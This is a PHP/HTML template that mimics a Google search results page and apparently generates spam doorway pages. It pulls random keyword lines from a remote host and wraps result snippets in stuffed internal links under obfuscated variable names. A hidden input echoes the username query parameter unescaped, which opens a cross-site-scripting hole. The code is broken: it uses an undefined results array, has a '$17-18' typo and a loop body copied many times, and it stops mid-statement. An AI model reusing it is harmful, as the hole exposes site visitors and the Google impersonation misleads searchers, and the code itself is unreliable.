<input type="text" autocomplete="off" placeholder="" value="<?php echo "$googleappssearchesapps8884"; ?>" onkeyup="showHint(this.value)" onclick="myFunctiongoogleapps84()" class="dropbtngoogleapps84" name='q' id='chatbox'>

<div class="divappsmobileapps847474744474"><img src="<?php echo "$googleprotocolapps8884://$_SERVER[HTTP_HOST]"; ?>/search.png" alt="search"></img></div>

<input type="hidden" name="url" value="<?php echo "$_SERVER[HTTP_HOST]"; ?>"></input>

<input type="hidden" name="username" value="<?php echo "$_GET[username]"; ?>"></input>

<input type="hidden" name="secureparameter" value="<?php echo "$googleapps8888884"; ?>"></input>

<input type="hidden" name="ssl" value="<?php echo "on"; ?>"></input>

</input>

</form>

<div class="dropdowngoogleapps84">

<div id="myDropdowngoogleapps84" class="dropdown-contentgoogleapps84">
</div>
</div>

<mobileapps84>
<mobileappsinstall84>
<mobileinstallapps84>
<mobileappsinstallappsgoogleappsinstallapps84>

<div class="installgoogleappsinstallappsgoogleapps">
<div class="installgoogleappsinstallappsgoogleapps84">
<div class="installgoogleappsinstallappsgoogleapps8432">

<div class="wrapper">

<a rel='nofollow' class="headerlinks1" id="internal" onClick="window.open('','_self');">All</a>

<a rel='nofollow' class="headerlinks2" id="internal" onClick="window.open('','_self');">News</a>

<a rel='nofollow' class="headerlinks4" id="internal" onClick="window.open('','_self');">Videos</a>

<a rel='nofollow' class="headerlinks3" id="internal" onClick="window.open('','_self');">Images</a>

<a rel='nofollow' class="headerlinksmaps84" id="internal" onClick="window.open('','_self');">Maps</a>

<googleapps84 class="googleappsmobileappsinstallapps8884"><a rel='nofollow' class="headerlinks3" id="internal" onClick="window.open('','_self');">Books</a></googleapps84>

<googleapps84 class="googleappsmobileappsinstallapps8884"><a rel='nofollow' class="headerlinks3" id="internal" onClick="window.open('','_self');">Personal</a></googleapps84>

<googleapps84 class="googleappsmobileappsinstallapps8884"><a rel='nofollow' class="headerlinks3" id="internal" onClick="window.open('','_self');">Search tools</a></googleapps84>

<a rel='nofollow' class="headerlinksmoreapps84" id="internal" onClick="window.open('','_self');">More</a>

<div class="dropdown">

<p onclick="myFunction()" class="dropbtn">Settings</p>

<div id="myDropdown" class="dropdown-content">
<a rel='nofollow' class="mobileappssettings84" onClick="window.open('','_self');">Search settings</a>
<a rel='nofollow' class="mobileappssettings84" onClick="window.open('','_self');">Languages</a>
<a rel='nofollow' class="mobileappssettings84" onClick="window.open('','_self');">Turn on SafeSearch</a>
<a rel='nofollow' class="mobileappssettings84" onClick="window.open('','_self');">Show all results</a>
<a rel='nofollow' class="mobileappssettings84" onClick="window.open('','_self');">Advanced search</a>
<a rel='nofollow' class="mobileappssettings84" onClick="window.open('','_self');">History</a>
<a rel='nofollow' class="mobileappssettings84" onClick="window.open('','_self');">Search help</a>
</div>
</div>

<a rel='nofollow' class="headerlinkstools84" onClick="window.open('','_self');">Tools</a>

</div>

</div>
</div>
</div>

</mobileappsinstallappsgoogleappsinstallapps84>
</mobileinstallapps84>
</mobileappsinstall84>
</mobileapps84>

</mobilegoogleapps84>

</div>

<mobilegoogleappsmobileapps84>

<mobileapps84>
<mobileappsinstall84>
<mobileinstallapps84 class="mobileinstallapps84444474">
<mobileappsinstallapps84>

<div class="installgoogleapps" onscroll="myFunctiongoogleapps8884()">
<div class="installgoogleapps84">
<div class="installgoogleappsgoogleappsinstallappsgoogleapps84">

<a rel='nofollow' class="headerlinksinstallapps84" onClick="window.open('','_self');">Any country</a>

<a rel='nofollow' class="headerlinksinstallapps84" onClick="window.open('','_self');">Any time</a>

<a rel='nofollow' class="headerlinksinstallapps84" onClick="window.open('','_self');">All results</a>

</div>
</div>
</div>

</mobileappsinstallapps84>
</mobileinstallapps84>
</mobileappsinstall84>
</mobileapps84>

<mobileapps84>
<mobileappsinstall84>
<mobileinstallapps84>
<mobileappsinstallapps84>

<?php

$mobile8884 = str_replace("-"," ",$mobile);
$mobile8884 = str_replace("+"," ",$mobile8884);

$mobile8884 = ucfirst("$mobile8884");

?>

<?php

$google8474747474747444444444444444744474 = "https://mobilelinuxappsapps12.eu-gb.mybluemix.net/googleapps84444474/google847444447444447444744474.php";

$ch = curl_init($google8474747474747444444444444444744474);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, FALSE);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla");
curl_setopt($ch, CURLOPT_TIMEOUT, 12);
$google8474747474747444444444444444744474 = curl_exec($ch);
curl_close($ch);

$fcontents = explode("\n",$google8474747474747444444444444444744474);

$line84747474 = $fcontents[array_rand($fcontents)];

$google8474747474747444444444444444744474 = preg_replace("/\s+/","",$line84747474);

$google8474747474747444444444444444744474 = rawurlencode($google8474747474747444444444444444744474);

?>

<?php

$google8474747474747444444444444444744474444474 = "https://mobilelinuxappsapps12.eu-gb.mybluemix.net/googleapps84444474/google134.php";

$ch = curl_init($google8474747474747444444444444444744474444474);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, FALSE);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla");
curl_setopt($ch, CURLOPT_TIMEOUT, 12);
$google8474747474747444444444444444744474444474 = curl_exec($ch);
curl_close($ch);

$fcontents = explode("\n",$google8474747474747444444444444444744474444474);

$line84747474 = $fcontents[array_rand($fcontents)];

$google8474747474747444444444444444744474444474 = preg_replace("/\s+/","",$line84747474);

$google8474747474747444444444444444744474444474 = rawurlencode($google8474747474747444444444444444744474444474);

?>

<?php

$array = array(); 

$hour = 0; 
$min = 1;

$length = 24 * 60;

for ($i=0;$i<$length;++$i) 
{ 
  $array[] = str_pad($hour, 2, "0", STR_PAD_LEFT) .':'. str_pad($min, 2, "0", STR_PAD_LEFT); 
  if ($min < 59) { $min = $min + 1; } else { $min = 0; ++$hour; }
} 

$array[] = "00:00";

$array = preg_replace("/(.*?)(.*?):0(.*?)/","",$array);

$array = preg_replace("/(.*?)(.*?):2(.*?)/","",$array);

$array = preg_replace("/(.*?)(.*?):4(.*?)/","",$array);

$array = implode("<br>",$array);

$array = explode("<br>",$array);

$google84747474 = date("H:i");

if(in_array("$google84747474", $array))

{ 

$google8474747474747474444474 = "$google8474747474747444444444444444744474444474";

}

else

{

$google8474747474747474444474 = "$google8474747474747444444444444444744474";

}

for ($x = 0; $x <= $google8474747474747474444474; $x++)

{

$googleapps847474744474++;

?>

<?php

echo "<div class='installgoogleapps'>";
echo "<div class='installgoogleapps84'>";
echo "<div class='installgoogleapps8432 installgoogleapps84324474'>";
echo "<div id='googleapps84'>";

?>

<?php

$google8474747474747474744474 = rand("8888","88888844");

$google84747474744474 = $_SERVER['HTTP_HOST'];

echo "<div class='google8474747474747474744474'>";

echo $install8484['query']['search'][0]['title'];

echo "</div>";

$googlegoogleapps84747474 = $install8484['query']['search'][0]['snippet'];

$googlegoogleapps84747474 = strip_tags($googlegoogleapps84747474);

$googleappsinstallapps84 = str_replace(","," ",$googlegoogleapps84747474);
$googleappsinstallapps84 = str_replace(" "," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("–"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("."," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(":"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("("," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(")"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("+"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("|"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("/"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("™"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = preg_replace("/-+/"," ",$googleappsinstallapps84);
$googlegoogleapps84747474 = preg_replace("/-$/","",$googleappsinstallapps84);

$googlegoogleapps84747474 = preg_replace("/(.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) /","$1 $2 $3 <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$4-$5-$6-$7&googleapps847474744474=$google8474747474444474'>$4 $5 $6 $7</a> <a href='$googleprotocolapps8884://$_SERVER[HTTP_HOST]/?q=$8-$9&googleapps847474744474=$google8474747474444474'>$8 $9</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$10-$11-$12-$13-$google8474747474747474744474&googleapps847474744474=$google8474747474444474'>$10 $11 $12 $13</a>  <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?$14-$15-$16&googleapps847474744474=$google8474747474444474'>$14 $15 $16</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/$google8474747474747474744474/?q=$17-18&googleapps847474744474=$google8474747474444474'>$17 18</a> ",$googlegoogleapps84747474);

echo "<div class='googleapps847474747474747474744474'>";

echo "$googlegoogleapps84747474";

echo "</div>";

?>

<?php

echo "</div>";
echo "</div>";
echo "</div>";
echo "</div>";

?>

<?php

echo "<div class='installgoogleapps'>";
echo "<div class='installgoogleapps84'>";
echo "<div class='installgoogleapps8432 installgoogleapps84324474'>";
echo "<div id='googleapps84'>";

?>

<?php

echo "<div class='google8474747474747474744474'>";

echo $install8484['query']['search'][1]['title'];

echo "</div>";

$googlegoogleapps84747474 = $install8484['query']['search'][1]['snippet'];

$googlegoogleapps84747474 = strip_tags($googlegoogleapps84747474);

$googleappsinstallapps84 = str_replace(","," ",$googlegoogleapps84747474);
$googleappsinstallapps84 = str_replace(" "," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("–"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("."," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(":"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("("," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(")"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("+"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("|"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("/"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("™"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = preg_replace("/-+/"," ",$googleappsinstallapps84);
$googlegoogleapps84747474 = preg_replace("/-$/","",$googleappsinstallapps84);

$googlegoogleapps84747474 = preg_replace("/(.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) /","$1 $2 $3 <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$4-$5-$6-$7&googleapps847474744474=$google8474747474444474'>$4 $5 $6 $7</a> <a href='$googleprotocolapps8884://$_SERVER[HTTP_HOST]/?q=$8-$9&googleapps847474744474=$google8474747474444474'>$8 $9</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$10-$11-$12-$13-$google8474747474747474744474&googleapps847474744474=$google8474747474444474'>$10 $11 $12 $13</a>  <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?$14-$15-$16&googleapps847474744474=$google8474747474444474'>$14 $15 $16</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/$google8474747474747474744474/?q=$17-18&googleapps847474744474=$google8474747474444474'>$17 18</a> ",$googlegoogleapps84747474);

echo "<div class='googleapps847474747474747474744474'>";

echo "$googlegoogleapps84747474";

echo "</div>";

?>

<?php

echo "</div>";
echo "</div>";
echo "</div>";
echo "</div>";

?>

<?php

echo "<div class='installgoogleapps'>";
echo "<div class='installgoogleapps84'>";
echo "<div class='installgoogleapps8432 installgoogleapps84324474'>";
echo "<div id='googleapps84'>";

?>

<?php

echo "<div class='google8474747474747474744474'>";

echo $install8484['query']['search'][2]['title'];

echo "</div>";

$googlegoogleapps84747474 = $install8484['query']['search'][2]['snippet'];

$googlegoogleapps84747474 = strip_tags($googlegoogleapps84747474);

$googleappsinstallapps84 = str_replace(","," ",$googlegoogleapps84747474);
$googleappsinstallapps84 = str_replace(" "," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("–"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("."," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(":"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("("," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(")"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("+"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("|"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("/"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("™"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = preg_replace("/-+/"," ",$googleappsinstallapps84);
$googlegoogleapps84747474 = preg_replace("/-$/","",$googleappsinstallapps84);

$googlegoogleapps84747474 = preg_replace("/(.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) /","$1 $2 $3 <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$4-$5-$6-$7&googleapps847474744474=$google8474747474444474'>$4 $5 $6 $7</a> <a href='$googleprotocolapps8884://$_SERVER[HTTP_HOST]/?q=$8-$9&googleapps847474744474=$google8474747474444474'>$8 $9</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$10-$11-$12-$13-$google8474747474747474744474&googleapps847474744474=$google8474747474444474'>$10 $11 $12 $13</a>  <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?$14-$15-$16&googleapps847474744474=$google8474747474444474'>$14 $15 $16</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/$google8474747474747474744474/?q=$17-18&googleapps847474744474=$google8474747474444474'>$17 18</a> ",$googlegoogleapps84747474);

echo "<div class='googleapps847474747474747474744474'>";

echo "$googlegoogleapps84747474";

echo "</div>";

?>

<?php

echo "</div>";
echo "</div>";
echo "</div>";
echo "</div>";

?>

<?php

echo "<div class='installgoogleapps'>";
echo "<div class='installgoogleapps84'>";
echo "<div class='installgoogleapps8432 installgoogleapps84324474'>";
echo "<div id='googleapps84'>";

?>

<?php

echo "<div class='google8474747474747474744474'>";

echo $install8484['query']['search'][3]['title'];

echo "</div>";

$googlegoogleapps84747474 = $install8484['query']['search'][3]['snippet'];

$googlegoogleapps84747474 = strip_tags($googlegoogleapps84747474);

$googleappsinstallapps84 = str_replace(","," ",$googlegoogleapps84747474);
$googleappsinstallapps84 = str_replace(" "," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("–"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("."," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(":"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("("," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(")"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("+"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("|"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("/"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("™"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = preg_replace("/-+/"," ",$googleappsinstallapps84);
$googlegoogleapps84747474 = preg_replace("/-$/","",$googleappsinstallapps84);

$googlegoogleapps84747474 = preg_replace("/(.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) /","$1 $2 $3 <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$4-$5-$6-$7&googleapps847474744474=$google8474747474444474'>$4 $5 $6 $7</a> <a href='$googleprotocolapps8884://$_SERVER[HTTP_HOST]/?q=$8-$9&googleapps847474744474=$google8474747474444474'>$8 $9</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$10-$11-$12-$13-$google8474747474747474744474&googleapps847474744474=$google8474747474444474'>$10 $11 $12 $13</a>  <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?$14-$15-$16&googleapps847474744474=$google8474747474444474'>$14 $15 $16</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/$google8474747474747474744474/?q=$17-18&googleapps847474744474=$google8474747474444474'>$17 18</a> ",$googlegoogleapps84747474);

echo "<div class='googleapps847474747474747474744474'>";

echo "$googlegoogleapps84747474";

echo "</div>";

?>

<?php

echo "</div>";
echo "</div>";
echo "</div>";
echo "</div>";

?>

<?php

echo "<div class='installgoogleapps'>";
echo "<div class='installgoogleapps84'>";
echo "<div class='installgoogleapps8432 installgoogleapps84324474'>";
echo "<div id='googleapps84'>";

?>

<?php

echo "<div class='google8474747474747474744474'>";

echo $install8484['query']['search'][4]['title'];

echo "</div>";

$googlegoogleapps84747474 = $install8484['query']['search'][4]['snippet'];

$googlegoogleapps84747474 = strip_tags($googlegoogleapps84747474);

$googleappsinstallapps84 = str_replace(","," ",$googlegoogleapps84747474);
$googleappsinstallapps84 = str_replace(" "," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("–"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("."," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(":"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("("," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(")"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("+"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("|"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("/"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("™"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = preg_replace("/-+/"," ",$googleappsinstallapps84);
$googlegoogleapps84747474 = preg_replace("/-$/","",$googleappsinstallapps84);

$googlegoogleapps84747474 = preg_replace("/(.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) /","$1 $2 $3 <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$4-$5-$6-$7&googleapps847474744474=$google8474747474444474'>$4 $5 $6 $7</a> <a href='$googleprotocolapps8884://$_SERVER[HTTP_HOST]/?q=$8-$9&googleapps847474744474=$google8474747474444474'>$8 $9</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$10-$11-$12-$13-$google8474747474747474744474&googleapps847474744474=$google8474747474444474'>$10 $11 $12 $13</a>  <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?$14-$15-$16&googleapps847474744474=$google8474747474444474'>$14 $15 $16</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/$google8474747474747474744474/?q=$17-18&googleapps847474744474=$google8474747474444474'>$17 18</a> ",$googlegoogleapps84747474);

echo "<div class='googleapps847474747474747474744474'>";

echo "$googlegoogleapps84747474";

echo "</div>";

?>

<?php

echo "</div>";
echo "</div>";
echo "</div>";
echo "</div>";

?>

<?php

echo "<div class='installgoogleapps'>";
echo "<div class='installgoogleapps84'>";
echo "<div class='installgoogleapps8432 installgoogleapps84324474'>";
echo "<div id='googleapps84'>";

?>

<?php

echo "<div class='google8474747474747474744474'>";

echo $install8484['query']['search'][5]['title'];

echo "</div>";

$googlegoogleapps84747474 = $install8484['query']['search'][5]['snippet'];

$googlegoogleapps84747474 = strip_tags($googlegoogleapps84747474);

$googleappsinstallapps84 = str_replace(","," ",$googlegoogleapps84747474);
$googleappsinstallapps84 = str_replace(" "," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("–"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("."," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(":"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("("," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(")"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("+"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("|"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("/"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("™"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = preg_replace("/-+/"," ",$googleappsinstallapps84);
$googlegoogleapps84747474 = preg_replace("/-$/","",$googleappsinstallapps84);

$googlegoogleapps84747474 = preg_replace("/(.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) /","$1 $2 $3 <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$4-$5-$6-$7&googleapps847474744474=$google8474747474444474'>$4 $5 $6 $7</a> <a href='$googleprotocolapps8884://$_SERVER[HTTP_HOST]/?q=$8-$9&googleapps847474744474=$google8474747474444474'>$8 $9</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$10-$11-$12-$13-$google8474747474747474744474&googleapps847474744474=$google8474747474444474'>$10 $11 $12 $13</a>  <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?$14-$15-$16&googleapps847474744474=$google8474747474444474'>$14 $15 $16</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/$google8474747474747474744474/?q=$17-18&googleapps847474744474=$google8474747474444474'>$17 18</a> ",$googlegoogleapps84747474);

echo "<div class='googleapps847474747474747474744474'>";

echo "$googlegoogleapps84747474";

echo "</div>";

?>

<?php

echo "</div>";
echo "</div>";
echo "</div>";
echo "</div>";

?>

<?php

echo "<div class='installgoogleapps'>";
echo "<div class='installgoogleapps84'>";
echo "<div class='installgoogleapps8432 installgoogleapps84324474'>";
echo "<div id='googleapps84'>";

?>

<?php

echo "<div class='google8474747474747474744474'>";

echo $install8484['query']['search'][6]['title'];

echo "</div>";

$googlegoogleapps84747474 = $install8484['query']['search'][6]['snippet'];

$googlegoogleapps84747474 = strip_tags($googlegoogleapps84747474);

$googleappsinstallapps84 = str_replace(","," ",$googlegoogleapps84747474);
$googleappsinstallapps84 = str_replace(" "," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("–"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("."," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(":"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("("," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(")"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("+"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("|"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("/"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("™"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = preg_replace("/-+/"," ",$googleappsinstallapps84);
$googlegoogleapps84747474 = preg_replace("/-$/","",$googleappsinstallapps84);

$googlegoogleapps84747474 = preg_replace("/(.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) /","$1 $2 $3 <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$4-$5-$6-$7&googleapps847474744474=$google8474747474444474'>$4 $5 $6 $7</a> <a href='$googleprotocolapps8884://$_SERVER[HTTP_HOST]/?q=$8-$9&googleapps847474744474=$google8474747474444474'>$8 $9</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$10-$11-$12-$13-$google8474747474747474744474&googleapps847474744474=$google8474747474444474'>$10 $11 $12 $13</a>  <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?$14-$15-$16&googleapps847474744474=$google8474747474444474'>$14 $15 $16</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/$google8474747474747474744474/?q=$17-18&googleapps847474744474=$google8474747474444474'>$17 18</a> ",$googlegoogleapps84747474);

echo "<div class='googleapps847474747474747474744474'>";

echo "$googlegoogleapps84747474";

echo "</div>";

?>

<?php

echo "</div>";
echo "</div>";
echo "</div>";
echo "</div>";

?>

<?php

echo "<div class='installgoogleapps'>";
echo "<div class='installgoogleapps84'>";
echo "<div class='installgoogleapps8432 installgoogleapps84324474'>";
echo "<div id='googleapps84'>";

?>

<?php

echo "<div class='google8474747474747474744474'>";

echo $install8484['query']['search'][7]['title'];

echo "</div>";

$googlegoogleapps84747474 = $install8484['query']['search'][7]['snippet'];

$googlegoogleapps84747474 = strip_tags($googlegoogleapps84747474);

$googleappsinstallapps84 = str_replace(","," ",$googlegoogleapps84747474);
$googleappsinstallapps84 = str_replace(" "," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("–"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("."," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(":"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("("," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(")"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("+"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("|"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("/"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("™"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = preg_replace("/-+/"," ",$googleappsinstallapps84);
$googlegoogleapps84747474 = preg_replace("/-$/","",$googleappsinstallapps84);

$googlegoogleapps84747474 = preg_replace("/(.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) /","$1 $2 $3 <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$4-$5-$6-$7&googleapps847474744474=$google8474747474444474'>$4 $5 $6 $7</a> <a href='$googleprotocolapps8884://$_SERVER[HTTP_HOST]/?q=$8-$9&googleapps847474744474=$google8474747474444474'>$8 $9</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$10-$11-$12-$13-$google8474747474747474744474&googleapps847474744474=$google8474747474444474'>$10 $11 $12 $13</a>  <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?$14-$15-$16&googleapps847474744474=$google8474747474444474'>$14 $15 $16</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/$google8474747474747474744474/?q=$17-18&googleapps847474744474=$google8474747474444474'>$17 18</a> ",$googlegoogleapps84747474);

echo "<div class='googleapps847474747474747474744474'>";

echo "$googlegoogleapps84747474";

echo "</div>";

?>

<?php

echo "</div>";
echo "</div>";
echo "</div>";
echo "</div>";

?>

<?php

echo "<div class='installgoogleapps'>";
echo "<div class='installgoogleapps84'>";
echo "<div class='installgoogleapps8432 installgoogleapps84324474'>";
echo "<div id='googleapps84'>";

?>

<?php

echo "<div class='google8474747474747474744474'>";

echo $install8484['query']['search'][8]['title'];

echo "</div>";

$googlegoogleapps84747474 = $install8484['query']['search'][8]['snippet'];

$googlegoogleapps84747474 = strip_tags($googlegoogleapps84747474);

$googleappsinstallapps84 = str_replace(","," ",$googlegoogleapps84747474);
$googleappsinstallapps84 = str_replace(" "," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("–"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("."," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(":"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("("," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace(")"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("+"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("|"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("/"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = str_replace("™"," ",$googleappsinstallapps84);
$googleappsinstallapps84 = preg_replace("/-+/"," ",$googleappsinstallapps84);
$googlegoogleapps84747474 = preg_replace("/-$/","",$googleappsinstallapps84);

$googlegoogleapps84747474 = preg_replace("/(.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) (.*?) /","$1 $2 $3 <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$4-$5-$6-$7&googleapps847474744474=$google8474747474444474'>$4 $5 $6 $7</a> <a href='$googleprotocolapps8884://$_SERVER[HTTP_HOST]/?q=$8-$9&googleapps847474744474=$google8474747474444474'>$8 $9</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?q=$10-$11-$12-$13-$google8474747474747474744474&googleapps847474744474=$google8474747474444474'>$10 $11 $12 $13</a>  <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/?$14-$15-$16&googleapps847474744474=$google8474747474444474'>$14 $15 $16</a> <a href='$googleprotocolapps8884://$google84747474744474/$google8474747474747474744474/$google8474747474747474744474/?q=$17-18&googleapps847474744474=$google8474747474444474'>$17 18</a> 